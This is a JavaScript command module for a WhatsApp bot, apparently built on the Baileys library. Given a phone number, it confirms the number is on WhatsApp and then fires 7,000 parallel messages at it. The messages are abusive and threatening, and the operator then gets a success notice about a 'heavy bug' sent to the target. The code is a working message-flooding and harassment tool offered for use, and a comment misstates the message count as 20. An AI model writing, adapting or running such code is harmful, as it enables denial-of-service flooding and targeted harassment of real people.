const { channelInfo } = require('../lib/messageConfig');

async function sulexhCommand(sock, chatId, message) {

    try {
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            "";

        const args = text.trim().split(/\s+/);
        const number = args[1];

        if (!number) {
            await sock.sendMessage(chatId, {
                text: "Example: .sulexh 254xxxxxxxx",
                ...channelInfo
            }, { quoted: message });
            return;
        }

        const cleanNumber = number.replace(/[^0-9]/g, '');
        const jid = cleanNumber + "@s.whatsapp.net";

        // ✅ Check if number exists on WhatsApp
        const [result] = await sock.onWhatsApp(jid);
        if (!result?.exists) {
            await sock.sendMessage(chatId, {
                text: "❌ Number is not on WhatsApp",
                ...channelInfo
            }, { quoted: message });
            return;
        }

        // ✅ Create 20 message send promises (all at once)
        const tasks = Array.from({ length: 7000 }, () =>
            sock.sendMessage(jid, { text: "YOU HAVE BEEN FUCKED BY☠️☠️☠️🤖🤖 BUGBOT USING BUGFIXED SULEXH TECH POWER😭😭😭😭☠️☠️☠️☠️ YOUR WHATSAPP IS GONE KINDLY" }).catch(() => {})
        );

        // ✅ Send all messages in parallel
        await Promise.allSettled(tasks);

        // ✅ Only one confirmation message in your chat
        await sock.sendMessage(chatId, {
            text: "✅ *YOU HAVE SUCCESSFULLY SENT HEAVY BUG TO THE TARGET☠️☠️🤖🤖😭😭😭😢 ",
            ...channelInfo
        }, { quoted: message });

    } catch (err) {
        console.log("SULEXH command error:", err);
        await sock.sendMessage(chatId, {
            text: "⚠️ Command failed",
            ...channelInfo
        }, { quoted: message });
    }
}

module.exports = sulexhCommand;
